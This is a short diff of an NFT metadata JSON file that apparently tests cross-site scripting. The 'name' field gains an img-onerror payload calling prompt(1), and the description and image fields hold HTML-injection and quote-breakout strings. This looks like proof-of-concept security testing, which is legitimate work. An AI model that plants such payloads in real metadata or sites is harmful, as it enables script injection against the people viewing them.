@@ -1,5 +1,5 @@
 {
-  "name": "Meme NFT<h1>test</h1>",
+  "name": "XSS NFT<img src=x onerror=prompt(1)>",
   "description": "alt text here <h1>test</h1>",
   "image": "https://az0mb13.github.io/xsstest/xss.svg\"><h1>anotherbig</h1>xxzxc",
   "attributes": [
